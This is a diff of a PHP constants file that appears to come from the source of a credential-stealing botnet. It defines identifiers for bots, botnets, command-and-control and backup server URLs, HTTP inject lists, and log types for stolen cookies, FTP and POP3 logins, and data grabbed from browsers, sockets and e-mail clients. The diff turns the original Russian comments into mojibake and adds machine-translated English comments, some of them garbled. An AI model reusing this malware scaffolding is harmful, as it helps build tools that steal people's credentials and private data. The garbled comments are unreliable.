@@ -1,65 +1,65 @@
 <?php
 /*
-  Список макросов общих для C и PHP.
-  Файл подключаеся в make.php
+  РЎРїРёСЃРѕРє РјР°РєСЂРѕСЃРѕРІ РѕР±С‰РёС… РґР»СЏ C Рё PHP.
+  Р¤Р°Р№Р» РїРѕРґРєР»СЋС‡Р°РµСЃСЏ РІ make.php
   
-  Примечание: Т.к. PHP использует только тип int(знаковый), то во всех макросов нужно использовать
-              знак минус для высоких значений.
+  РџСЂРёРјРµС‡Р°РЅРёРµ: Рў.Рє. PHP РёСЃРїРѕР»СЊР·СѓРµС‚ С‚РѕР»СЊРєРѕ С‚РёРї int(Р·РЅР°РєРѕРІС‹Р№), С‚Рѕ РІРѕ РІСЃРµС… РјР°РєСЂРѕСЃРѕРІ РЅСѓР¶РЅРѕ РёСЃРїРѕР»СЊР·РѕРІР°С‚СЊ
+              Р·РЅР°Рє РјРёРЅСѓСЃ РґР»СЏ РІС‹СЃРѕРєРёС… Р·РЅР°С‡РµРЅРёР№.
 */
 
-//ID для BinStorage элементов.
-$_COMMON_DEFINE['SBCID_BOT_ID']                = '10001'; //ID бота.
-$_COMMON_DEFINE['SBCID_BOTNET']                = '10002'; //Ботнет.
-$_COMMON_DEFINE['SBCID_BOT_VERSION']           = '10003'; //Версия.
-$_COMMON_DEFINE['SBCID_NET_LATENCY']           = '10005'; //Лаг сети.
-$_COMMON_DEFINE['SBCID_TCPPORT_S1']            = '10006'; //Порт для Socks.
-$_COMMON_DEFINE['SBCID_PATH_SOURCE']           = '10007'; //Исходный путь файла.
-$_COMMON_DEFINE['SBCID_PATH_DEST']             = '10008'; //Конечный путь файла.
-$_COMMON_DEFINE['SBCID_TIME_SYSTEM']           = '10009'; //Системное время.
+//ID for BinStorage elements.
+$_COMMON_DEFINE['SBCID_BOT_ID']                = '10001'; //ID Bot.
+$_COMMON_DEFINE['SBCID_BOTNET']                = '10002'; //Botnet.
+$_COMMON_DEFINE['SBCID_BOT_VERSION']           = '10003'; //Version.
+$_COMMON_DEFINE['SBCID_NET_LATENCY']           = '10005'; //Lag network.
+$_COMMON_DEFINE['SBCID_TCPPORT_S1']            = '10006'; //Port for Socks.
+$_COMMON_DEFINE['SBCID_PATH_SOURCE']           = '10007'; //Source file path.
+$_COMMON_DEFINE['SBCID_PATH_DEST']             = '10008'; //The final path of the file.
+$_COMMON_DEFINE['SBCID_TIME_SYSTEM']           = '10009'; //System time.
 $_COMMON_DEFINE['SBCID_TIME_TICK']             = '10010'; //GetTickCount.
-$_COMMON_DEFINE['SBCID_TIME_LOCALBIAS']        = '10011'; //GMT оффсет.
-$_COMMON_DEFINE['SBCID_OS_INFO']               = '10012'; //Версия OS DWORD[5](major, minor, build_number, sp, (wSuiteMask + wProductType)).
-$_COMMON_DEFINE['SBCID_LANGUAGE_ID']           = '10013'; //ID языка.
-$_COMMON_DEFINE['SBCID_PROCESS_NAME']          = '10014'; //Путь процесса.
-$_COMMON_DEFINE['SBCID_PROCESS_USER']          = '10015'; //Имя пользователя для процесса.
-$_COMMON_DEFINE['SBCID_IPV4_ADDRESSES']        = '10016'; //Список IPv4.
-$_COMMON_DEFINE['SBCID_IPV6_ADDRESSES']        = '10017'; //Список IPv6.
-$_COMMON_DEFINE['SBCID_BOTLOG_TYPE']           = '10018'; //Тип лога.
-$_COMMON_DEFINE['SBCID_BOTLOG']                = '10019'; //Лог.
+$_COMMON_DEFINE['SBCID_TIME_LOCALBIAS']        = '10011'; //GMT offset.
+$_COMMON_DEFINE['SBCID_OS_INFO']               = '10012'; //Version of the OS DWORD [5] (major, minor, build_number, sp, (wSuiteMask + wProductType)).
+$_COMMON_DEFINE['SBCID_LANGUAGE_ID']           = '10013'; //Language ID.
+$_COMMON_DEFINE['SBCID_PROCESS_NAME']          = '10014'; //Way process.
+$_COMMON_DEFINE['SBCID_PROCESS_USER']          = '10015'; //User name for the process.
+$_COMMON_DEFINE['SBCID_IPV4_ADDRESSES']        = '10016'; //List of IPv4.
+$_COMMON_DEFINE['SBCID_IPV6_ADDRESSES']        = '10017'; //List of IPv6.
+$_COMMON_DEFINE['SBCID_BOTLOG_TYPE']           = '10018'; //Type of log.
+$_COMMON_DEFINE['SBCID_BOTLOG']                = '10019'; //Log.
 
-$_COMMON_DEFINE['SBCID_SCRIPT_ID']             = '11000'; //ID выполненого скрипта. MD5 хэш.
-$_COMMON_DEFINE['SBCID_SCRIPT_STATUS']         = '11001'; //Статус выполненого скрипта.
-$_COMMON_DEFINE['SBCID_SCRIPT_RESULT']         = '11002'; //Текствый отчет об исполнении команды. Не более 0xFFFF символов.
+$_COMMON_DEFINE['SBCID_SCRIPT_ID']             = '11000'; //ID of the script. MD5 hash.
+$_COMMON_DEFINE['SBCID_SCRIPT_STATUS']         = '11001'; //The status of the script.
+$_COMMON_DEFINE['SBCID_SCRIPT_RESULT']         = '11002'; //Tekstvy report on the implementation team. No more than 0xFFFF characters.
 
-$_COMMON_DEFINE['CFGID_LAST_VERSION']          = '20001'; //Последняя доступная версия бота.
-$_COMMON_DEFINE['CFGID_LAST_VERSION_URL']      = '20002'; //URL, где можно скачать последнию версию бота.
-$_COMMON_DEFINE['CFGID_URL_SERVER_0']          = '20003'; //URL серверного скрипта.
-$_COMMON_DEFINE['CFGID_URL_ADV_SERVERS']       = '20004'; //Мульти-строка резервных адресов серверного скрипта.
-$_COMMON_DEFINE['CFGID_HTTP_FILTER']           = '20005'; //Мульти-строка для фильтрации HTTP.
-$_COMMON_DEFINE['CFGID_HTTP_POSTDATA_FILTER']  = '20006'; //Мульти-строка для фильтрации пост-данных.
-$_COMMON_DEFINE['CFGID_HTTP_INJECTS_LIST']     = '20007'; //Список HTTP-инжектов/фейков.
-$_COMMON_DEFINE['CFGID_DNS_LIST']              = '20008'; //Список DNS.
+$_COMMON_DEFINE['CFGID_LAST_VERSION']          = '20001'; //The latest available version of the bot.
+$_COMMON_DEFINE['CFGID_LAST_VERSION_URL']      = '20002'; //URL, where you can download the latest version of the bot.
+$_COMMON_DEFINE['CFGID_URL_SERVER_0']          = '20003'; //URL server-side script.
+$_COMMON_DEFINE['CFGID_URL_ADV_SERVERS']       = '20004'; //Multi-line backup addresses the server script.
+$_COMMON_DEFINE['CFGID_HTTP_FILTER']           = '20005'; //Multi-line filtering HTTP.
+$_COMMON_DEFINE['CFGID_HTTP_POSTDATA_FILTER']  = '20006'; //Multi-line for post-filtering of data.
+$_COMMON_DEFINE['CFGID_HTTP_INJECTS_LIST']     = '20007'; //List HTTP-inzhektov/feykov.
+$_COMMON_DEFINE['CFGID_DNS_LIST']              = '20008'; //List of DNS.
 
-//Значения для SBCID_BOTLOG_TYPE.
-$_COMMON_DEFINE['BLT_UNKNOWN']                 = '0';   //Неивестный отчет.
+//Values вЂ‹вЂ‹for SBCID_BOTLOG_TYPE.
+$_COMMON_DEFINE['BLT_UNKNOWN']                 = '0';   //Neivestny report.
 
-$_COMMON_DEFINE['BLT_COOKIES']                 = '1';   //Кукисы браузеров.
-$_COMMON_DEFINE['BLT_FILE']                    = '2';   //Файл.
+$_COMMON_DEFINE['BLT_COOKIES']                 = '1';   //Cookies browsers.
+$_COMMON_DEFINE['BLT_FILE']                    = '2';   //File.
 
-$_COMMON_DEFINE['BLT_HTTP_REQUEST']            = '11';  //HTTP-запрос.
-$_COMMON_DEFINE['BLT_HTTPS_REQUEST']           = '12';  //HTTPS-запрос.
+$_COMMON_DEFINE['BLT_HTTP_REQUEST']            = '11';  //HTTP-request.
+$_COMMON_DEFINE['BLT_HTTPS_REQUEST']           = '12';  //HTTPS-Request.
 
-$_COMMON_DEFINE['BLT_LOGIN_FTP']               = '100'; //Логин FTP.
-$_COMMON_DEFINE['BLT_LOGIN_POP3']              = '101'; //Логин POP3.
+$_COMMON_DEFINE['BLT_LOGIN_FTP']               = '100'; //Login FTP.
+$_COMMON_DEFINE['BLT_LOGIN_POP3']              = '101'; //Login POP3.
 
-$_COMMON_DEFINE['BLT_GRABBED_UI']              = '200'; //Данные полученые из User Interface.
-$_COMMON_DEFINE['BLT_GRABBED_HTTP']            = '201'; //Данные полученые из HTTP(s).
-$_COMMON_DEFINE['BLT_GRABBED_WSOCKET']         = '202'; //Данные полученые из WinSocket.
-$_COMMON_DEFINE['BLT_GRABBED_FTPSOFTWARE']     = '203'; //Данные полученые из FTP-клиентов.
-$_COMMON_DEFINE['BLT_GRABBED_EMAILSOFTWARE']   = '204'; //Данные полученые из E-mail-клиентов.
-$_COMMON_DEFINE['BLT_GRABBED_OTHER']           = '299'; //Данные полученые из других источников.
+$_COMMON_DEFINE['BLT_GRABBED_UI']              = '200'; //Data obtained from the User Interface.
+$_COMMON_DEFINE['BLT_GRABBED_HTTP']            = '201'; //Data obtained from the HTTP (s).
+$_COMMON_DEFINE['BLT_GRABBED_WSOCKET']         = '202'; //Data obtained from WinSocket.
+$_COMMON_DEFINE['BLT_GRABBED_FTPSOFTWARE']     = '203'; //Data obtained from the FTP-client.
+$_COMMON_DEFINE['BLT_GRABBED_EMAILSOFTWARE']   = '204'; //Data obtained from the E-mail-clients.
+$_COMMON_DEFINE['BLT_GRABBED_OTHER']           = '299'; //The data obtained from other sources.
 
-//Лимиты.
-$_COMMON_DEFINE['BOT_ID_MAX_CHARS']            = '100'; //Максимальный размер имени бота
-$_COMMON_DEFINE['BOTNET_MAX_CHARS']            = '20';  //Максимальный размер имени ботнета
+//Limits.
+$_COMMON_DEFINE['BOT_ID_MAX_CHARS']            = '100'; //The maximum size of the name of the bot
+$_COMMON_DEFINE['BOTNET_MAX_CHARS']            = '20';  //The maximum size of the name of a botnet
 ?>
